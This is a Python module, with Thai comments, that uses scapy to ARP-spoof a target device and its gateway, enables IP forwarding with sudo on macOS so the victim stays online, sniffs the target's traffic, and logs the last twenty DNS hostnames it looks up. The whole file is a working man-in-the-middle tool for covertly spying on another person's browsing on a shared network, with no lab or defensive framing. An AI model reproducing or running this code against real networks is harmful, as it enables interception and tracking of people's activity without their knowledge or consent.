import threading
import time
import logging
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Ether, ARP, sendp, conf
# เราจะใช้การวิเคราะห์ DNS เป็นหลัก และพยายามดึงข้อมูลจาก IP ปลายทาง

logger = logging.getLogger(__name__)

# โครงสร้างเก็บข้อมูล: { target_ip: { "connections": [ { "host": str, "time": float } ], "stop_event": Event } }
_active_monitors = {}
_lock = threading.Lock()

def _get_gateway_info():
    from scapy.all import conf, srp
    try:
        gw_ip = conf.route.route("0.0.0.0")[2]
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip), timeout=2, verbose=False)
        if ans:
            return gw_ip, ans[0][1].hwsrc
    except:
        pass
    return None, None

def _spoof_loop(target_ip, target_mac, gw_ip, gw_mac, stop_event):
    from scapy.all import get_if_hwaddr
    local_mac = get_if_hwaddr(conf.iface)
    
    pkt_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip, hwsrc=local_mac)
    pkt_gw = Ether(dst=gw_mac)/ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=local_mac)
    
    while not stop_event.is_set():
        sendp(pkt_target, verbose=False)
        sendp(pkt_gw, verbose=False)
        stop_event.wait(2)

def _process_packet(target_ip):
    def handler(pkt):
        if not pkt.haslayer(IP): return
        
        host = None
        # ดึงข้อมูลจาก DNS Query
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            if pkt.haslayer(DNSQR):
                try:
                    host = pkt[DNSQR].qname.decode().strip(".")
                except: pass
        
        # ถ้าดึง Host ได้ และเป็น IP ที่เราสนใจ
        if host and target_ip in _active_monitors:
            # กรองเว็บพื้นฐานที่ไม่น่าสนใจออก (เช่น mDNS หรือ Local)
            if any(ext in host for ext in [".local", "arpa", ".lan"]): return

            with _lock:
                conns = _active_monitors[target_ip]["connections"]
                # ป้องกันการเก็บซ้ำติดๆ กัน
                if not any(c["host"] == host for c in conns[-5:]):
                    conns.append({"host": host, "time": time.time()})
                    # เก็บไว้แค่ 20 รายการล่าสุด
                    if len(conns) > 20:
                        conns.pop(0)
                        
    return handler

def _sniff_loop(target_ip, stop_event):
    # ดักจับทั้ง DNS และ HTTP/HTTPS ทราฟฟิก
    sniff(filter=f"host {target_ip}", 
          prn=_process_packet(target_ip), 
          stop_filter=lambda x: stop_event.is_set(),
          store=0)

def start_monitoring(target_ip, target_mac):
    with _lock:
        if target_ip in _active_monitors:
            return
        
        gw_ip, gw_mac = _get_gateway_info()
        if not gw_ip: 
            logger.error("Could not find gateway info for monitoring")
            return
        
        # เปิด IP Forwarding เพื่อให้เน็ตไม่หลุดขณะส่อง
        try:
            import platform
            import subprocess
            if platform.system() == "Darwin":
                subprocess.run(["sudo", "sysctl", "-w", "net.inet.ip.forwarding=1"], capture_output=True)
        except: pass

        stop_event = threading.Event()
        _active_monitors[target_ip] = {"connections": [], "stop_event": stop_event}
        
        # รันทั้ง Spoof และ Sniff
        threading.Thread(target=_spoof_loop, args=(target_ip, target_mac, gw_ip, gw_mac, stop_event), daemon=True).start()
        threading.Thread(target=_sniff_loop, args=(target_ip, stop_event), daemon=True).start()
        logger.info(f"📊 Monitoring started for {target_ip}")

def stop_monitoring(target_ip):
    with _lock:
        monitor = _active_monitors.pop(target_ip, None)
        if monitor:
            monitor["stop_event"].set()
            logger.info(f"🛑 Monitoring stopped for {target_ip}")

def get_connections(target_ip):
    with _lock:
        if target_ip in _active_monitors:
            return _active_monitors[target_ip]["connections"]
    return []
